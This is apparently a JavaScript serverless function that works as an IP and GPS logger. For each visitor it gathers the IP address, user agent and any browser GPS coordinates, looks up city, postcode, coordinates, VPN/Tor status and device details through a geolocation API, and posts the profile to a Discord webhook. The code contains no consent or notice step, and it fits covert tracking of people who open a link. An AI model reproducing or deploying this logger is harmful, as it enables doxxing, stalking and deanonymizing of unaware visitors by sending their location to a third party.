// api/log.js - Vercel Serverless Function

const fetch = require('node-fetch');

export default async function handler(req, res) {
  // Enable CORS for browser requests
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  // Handle preflight
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }
  
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }
  
  try {
    const API_KEY = process.env.BIGDATACLOUD_API_KEY;
    const IP_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;
    const GPS_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;
    
    if (!API_KEY) {
      return res.status(500).json({ error: 'API key not configured' });
    }
    
    const { gpsCoordinates, userAgent } = req.body;
    const clientIP = req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || req.connection.remoteAddress;
    
    // Always get IP geolocation first
    const ipGeoData = await fetchIPGeolocation(clientIP, API_KEY);
    const userAgentData = await fetchUserAgentInfo(userAgent, API_KEY);
    const riskData = await fetchRiskInfo(API_KEY);
    
    // Prepare and send IP webhook
    const ipWebhookData = prepareIPWebhookData(ipGeoData, userAgentData, riskData, clientIP);
    await sendWebhook(IP_WEBHOOK_URL, {
      source: 'server_ip_geolocation',
      timestamp: new Date().toISOString(),
      data: ipWebhookData
    });
    
    let gpsResponse = null;
    
    // If GPS coordinates provided, get reverse geocode
    if (gpsCoordinates && gpsCoordinates.latitude && gpsCoordinates.longitude) {
      const reverseGeoData = await fetchReverseGeocode(
        gpsCoordinates.latitude, 
        gpsCoordinates.longitude, 
        API_KEY
      );
      
      // Prepare and send GPS webhook
      const gpsWebhookData = prepareGPSWebhookData(reverseGeoData, gpsCoordinates);
      await sendWebhook(GPS_WEBHOOK_URL, {
        source: 'server_gps_reverse_geocode',
        timestamp: new Date().toISOString(),
        data: gpsWebhookData
      });
      
      gpsResponse = {
        success: true,
        message: 'GPS reverse geocode data sent',
        gpsData: gpsWebhookData
      };
    }
    
    // Return response to client
    res.status(200).json({
      success: true,
      ipDataSent: true,
      gpsDataSent: !!gpsCoordinates,
      ipData: ipWebhookData,
      gpsData: gpsResponse?.gpsData || null
    });
    
  } catch (error) {
    console.error('Server error:', error);
    res.status(500).json({ 
      error: 'Internal server error',
      message: error.message 
    });
  }
}

// Helper functions
async function fetchIPGeolocation(ip, apiKey) {
  const response = await fetch(
    `https://api-bdc.net/data/ip-geolocation-full?ip=${ip}&key=${apiKey}`
  );
  return response.json();
}

async function fetchUserAgentInfo(userAgentString, apiKey) {
  const response = await fetch(
    `https://api-bdc.net/data/user-agent-info?key=${apiKey}&userAgent=${encodeURIComponent(userAgentString)}`
  );
  return response.json();
}

async function fetchRiskInfo(apiKey) {
  const response = await fetch(
    `https://api-bdc.net/data/user-risk?key=${apiKey}`
  );
  return response.json();
}

async function fetchReverseGeocode(lat, lng, apiKey) {
  const response = await fetch(
    `https://api-bdc.net/data/reverse-geocode-with-timezone?latitude=${lat}&longitude=${lng}&key=${apiKey}`
  );
  return response.json();
}

function prepareIPWebhookData(ipGeoData, userAgentData, riskData, clientIP) {
  return {
    'IP Address (ip)': ipGeoData.ip || clientIP,
    'Continent (continent)': ipGeoData.location?.continent || 'N/A',
    'Country (name)': ipGeoData.country?.name || 'N/A',
    'Region (principalSubdivision)': ipGeoData.location?.principalSubdivision || 'N/A',
    'City (city)': ipGeoData.location?.city || ipGeoData.location?.localityName || 'N/A',
    'Locality (localityName)': ipGeoData.location?.localityName || 'N/A',
    'Post Code (postcode)': ipGeoData.location?.postcode || 'N/A',
    'Coordinates (latitude & longitude)': ipGeoData.location?.latitude && ipGeoData.location?.longitude 
      ? `${ipGeoData.location.latitude}, ${ipGeoData.location.longitude}` 
      : 'N/A',
    'Timezone (ianaTimeId)': ipGeoData.location?.timeZone?.ianaTimeId || 'N/A',
    'Localtime (localTime)': ipGeoData.location?.timeZone?.localTime || 'N/A',
    'ASN (asn inside carriers)': ipGeoData.network?.carriers?.[0]?.asn || 'N/A',
    'Organization (organisation inside carriers)': ipGeoData.network?.carriers?.[0]?.organisation || 'N/A',
    'Confidence (confidence)': ipGeoData.confidence || 'N/A',
    
    // Security data
    'Security Threat (securityThreat)': ipGeoData.securityThreat || 'N/A',
    'VPN (isKnownAsVpn)': ipGeoData.hazardReport?.isKnownAsVpn ? 'Yes' : 'No',
    'Proxy (isKnownAsProxy)': ipGeoData.hazardReport?.isKnownAsProxy ? 'Yes' : 'No',
    'Tor (isKnownAsTorServer)': ipGeoData.hazardReport?.isKnownAsTorServer ? 'Yes' : 'No',
    'Hosting ASN (isHostingAsn)': ipGeoData.hazardReport?.isHostingAsn ? 'Yes' : 'No',
    'Cellular Network (isCellular)': ipGeoData.hazardReport?.isCellular ? 'Yes' : 'No',
    
    // Risk and User Agent
    'Risk (risk)': riskData.risk || 'N/A',
    'User Agent (from the browser)': userAgentData.userAgent || 'N/A',
    'Device (device)': userAgentData.device || 'N/A',
    'OS (os)': userAgentData.os || 'N/A',
    'Mobile (isMobile)': userAgentData.isMobile ? 'Yes' : 'No',
    'Bot (isSpider)': userAgentData.isSpider ? 'Yes' : 'No'
  };
}

function prepareGPSWebhookData(reverseGeoData, gpsCoordinates) {
  return {
    'Source': 'gps_reverse_geocode',
    'IP Address (ip)': 'GPS-based - Not applicable',
    'Continent (continent)': reverseGeoData.continent || 'N/A',
    'Country (name)': reverseGeoData.countryName || 'N/A',
    'Region (principalSubdivision)': reverseGeoData.principalSubdivision || 'N/A',
    'City (city)': reverseGeoData.city || 'N/A',
    'Locality (locality)': reverseGeoData.locality || 'N/A',
    'Post Code (postcode)': reverseGeoData.postcode || 'N/A',
    'Coordinates (latitude & longitude)': `${reverseGeoData.latitude}, ${reverseGeoData.longitude}`,
    'Timezone (ianaTimeId)': reverseGeoData.timeZone?.ianaTimeId || 'N/A',
    'Localtime (localTime)': reverseGeoData.timeZone?.localTime || 'N/A',
    'ASN (asn inside carriers)': 'GPS-based - Not applicable',
    'Organization (organisation inside carriers)': 'GPS-based - Not applicable',
    'Confidence (confidence)': 'High (GPS)',
    'GPS Accuracy': 'Direct GPS coordinates',
    'GPS Source': 'Browser geolocation API'
  };
}

async function sendWebhook(webhookUrl, data) {
  if (!webhookUrl || webhookUrl.includes('YOUR_')) {
    console.log('Webhook not sent - URL not configured:', data);
    return { sent: false, reason: 'URL not configured' };
  }
  
  try {
    const response = await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data)
    });
    
    return { 
      sent: response.ok, 
      status: response.status,
      statusText: response.statusText
    };
  } catch (error) {
    console.error('Webhook error:', error);
    return { sent: false, error: error.message };
  }
}
